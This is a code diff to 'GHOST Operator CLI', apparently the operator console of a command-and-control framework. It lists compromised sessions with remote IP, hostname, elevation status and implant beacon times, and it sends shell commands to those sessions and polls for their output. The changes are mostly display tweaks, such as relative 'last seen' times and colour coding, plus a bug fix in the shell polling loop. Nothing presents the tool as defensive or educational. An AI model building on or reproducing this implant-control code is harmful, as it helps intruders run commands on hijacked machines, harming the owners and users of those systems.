@@ -1,12 +1,12 @@
 """
-GHOST Operator CLI – Fully Working
+GHOST Operator CLI – Fully Working with Enhanced Session Display
 """
 import argparse
 import json
 import os
 import sys
 import time
-from datetime import datetime
+from datetime import datetime, timezone
 from typing import Optional
 from urllib.parse import quote
 
@@ -30,6 +30,7 @@ YELLOW  = "\033[93m"
 CYAN    = "\033[96m"
 GREY    = "\033[90m"
 MAGENTA = "\033[95m"
+WHITE   = "\033[97m"
 
 def _supports_color() -> bool:
     return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()
@@ -41,6 +42,50 @@ def ok(msg: str)   -> None: print(c(f"[+] {msg}", GREEN))
 def err(msg: str)  -> None: print(c(f"[!] {msg}", RED), file=sys.stderr)
 def info(msg: str) -> None: print(c(f"[*] {msg}", CYAN))
 def warn(msg: str) -> None: print(c(f"[-] {msg}", YELLOW))
+
+# ---------------------------------------------------------------------------
+# Human‑readable relative time
+# ---------------------------------------------------------------------------
+
+def human_time_ago(iso_time: str) -> str:
+    """Return a relative time string like '5s ago', '2m ago', '1h ago'."""
+    try:
+        dt = datetime.fromisoformat(iso_time)
+    except Exception:
+        return iso_time[:19]
+    now = datetime.now(timezone.utc)
+    # If the timestamp is naive, assume it's UTC (Worker uses UTC)
+    if dt.tzinfo is None:
+        dt = dt.replace(tzinfo=timezone.utc)
+    diff = (now - dt).total_seconds()
+    if diff < 60:
+        return f"{int(diff)}s ago"
+    elif diff < 3600:
+        mins = int(diff // 60)
+        return f"{mins}m ago"
+    elif diff < 86400:
+        hrs = int(diff // 3600)
+        return f"{hrs}h ago"
+    else:
+        days = int(diff // 86400)
+        return f"{days}d ago"
+
+def time_color(iso_time: str) -> str:
+    """Return a colour based on age."""
+    try:
+        dt = datetime.fromisoformat(iso_time)
+    except Exception:
+        return GREY
+    if dt.tzinfo is None:
+        dt = dt.replace(tzinfo=timezone.utc)
+    now = datetime.now(timezone.utc)
+    diff = (now - dt).total_seconds()
+    if diff < 60:
+        return GREEN
+    elif diff < 300:
+        return YELLOW
+    else:
+        return RED
 
 # ---------------------------------------------------------------------------
 # Client – handles URL encoding automatically
@@ -83,13 +128,11 @@ class GhostClient:
         return self._post("/task", {"session": sid, "cmd": cmd})
 
     def results(self, sid: str, clear: bool = False) -> dict:
-        """Retrieve results. If clear=True, results are removed after retrieval."""
         params = {"clear": "1"} if clear else {}
-        encoded_sid = quote(sid, safe="")   # URL‑encode pipe and others
+        encoded_sid = quote(sid, safe="")
         return self._get(f"/results/{encoded_sid}", params=params)
 
     def clear_results(self, sid: str) -> dict:
-        """Explicitly clear results for a session."""
         encoded_sid = quote(sid, safe="")
         return self._get(f"/results/{encoded_sid}", params={"clear": "1"})
 
@@ -101,7 +144,7 @@ class GhostClient:
         return self._get("/audit", params={"limit": limit})
 
 # ---------------------------------------------------------------------------
-# Display helpers
+# Display helpers – enhanced session table
 # ---------------------------------------------------------------------------
 
 def _idle_label(idle_sec: float) -> str:
@@ -118,11 +161,12 @@ def print_sessions(sessions: list) -> None:
         warn("No active sessions.")
         return
 
-    col_w = [36, 16, 24, 8, 10, 7, 8]
+    # Column widths
+    col_w = [36, 16, 20, 10, 12, 7, 8]
     header = (
         f"{'SESSION ID':<{col_w[0]}} "
         f"{'REMOTE IP':<{col_w[1]}} "
-        f"{'LAST BEACON':<{col_w[2]}} "
+        f"{'LAST SEEN':<{col_w[2]}} "
         f"{'IDLE':<{col_w[3]}} "
         f"{'HOSTNAME':<{col_w[4]}} "
         f"{'ELEV':<{col_w[5]}} "
@@ -130,15 +174,14 @@ def print_sessions(sessions: list) -> None:
     )
     print()
     print(c(header, BOLD + CYAN))
-    print(c("-" * sum(col_w + [len(col_w) - 1]), GREY))
+    print(c("-" * (sum(col_w) + len(col_w) - 1), GREY))
 
     for s in sessions:
         last_beacon = s.get("last_beacon", "")
-        try:
-            dt = datetime.fromisoformat(last_beacon)
-            last_str = dt.astimezone().strftime("%Y-%m-%d %H:%M:%S")
-        except Exception:
-            last_str = last_beacon[:19]
+        # Relative time with colour
+        rel_time = human_time_ago(last_beacon)
+        rel_col = time_color(last_beacon)
+        last_seen_str = c(rel_time, rel_col)
 
         recon    = s.get("recon", {})
         hostname = recon.get("hostname", "?")[:10]
@@ -151,7 +194,7 @@ def print_sessions(sessions: list) -> None:
         print(
             f"{c(sid, MAGENTA):<{col_w[0]}} "
             f"{ip:<{col_w[1]}} "
-            f"{last_str:<{col_w[2]}} "
+            f"{last_seen_str:<{col_w[2]}} "
             f"{idle:<{col_w[3]}} "
             f"{hostname:<{col_w[4]}} "
             f"{elevated:<{col_w[5]}} "
@@ -255,19 +298,17 @@ def cmd_shell(client: GhostClient, args) -> None:
             continue
 
         info("Waiting for result...")
-        # Poll with clear=True – fetch and clear in one request
-        deadline = time.time() + 60  # 60 seconds max (implant beacons every 5s)
+        deadline = time.time() + 60
         got_result = False
         while time.time() < deadline:
-            time.sleep(2)  # poll every 2 seconds
+            time.sleep(2)
             try:
                 data = client.results(sid, clear=True)
                 if data.get("results"):
                     print_results(data)
                     got_result = True
                     break
-            except requests.HTTPError:
-                # If we get 404, session may have died – exit
+            except requests.HTTPError as e:
                 if e.response.status_code == 404:
                     err("Session not found – it may have expired.")
                     return
